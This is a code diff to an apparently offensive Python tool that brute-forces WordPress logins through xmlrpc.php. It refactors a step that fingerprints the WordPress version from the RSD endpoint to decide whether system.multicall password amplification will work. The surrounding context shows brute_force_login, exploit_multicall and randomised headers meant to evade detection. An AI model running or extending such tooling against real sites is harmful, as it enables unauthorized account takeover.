@@ -252,17 +252,23 @@ async def brute_force_login(url, username, password, session):
 # ==================================================================================================
 # ==================================================================================================
 # ==================================================================================================
-async def detect_rest_api(url, session):
-    """Function detecting WP-API REST endpoint from /xmlrpc.php?rsd"""
+
+async def detect_rest_api_route(url, session):
+    """Function detecting WP-API REST route from /xmlrpc.php?rsd"""
     headers = generate_random_headers(url)
     async with session.get(url + '/xmlrpc.php?rsd', headers=headers, ssl=False) as resp:
         response_text = await resp.text()
         xmlroot = ET.fromstring(response_text.strip())
-        api_endpoints = xmlroot.findall('.//{*}api[@name="WP-API"]')
-        rest_api_detected = len(api_endpoints) == 1
-        if rest_api_detected:
+        rest_api = xmlroot.find('.//{*}api[@name="WP-API"]')
+        if rest_api is not None:
             logging.warning("WP-API REST endpoint detected - host is version 4.4 or later")
-        return rest_api_detected
+            return rest_api.get('apiLink')
+
+        return None
+
+# ==================================================================================================
+# ==================================================================================================
+# ==================================================================================================
 
 async def exploit_multicall(url, usernames, passwords, session):
     headers = generate_random_headers(url)
@@ -668,8 +674,8 @@ async def main():
         ).lower()
 
         if multicall_choice == "y":
-            rest_api_detected = await detect_rest_api(url, session)
-            if rest_api_detected:
+            rest_api_detected = await detect_rest_api_route(url, session)
+            if rest_api_detected is not None:
                 logging.error(
                     "system.multicall was modified in version 4.4 to invalidate all calls "
                     "after an invalid one was detected. Try again without multicall."
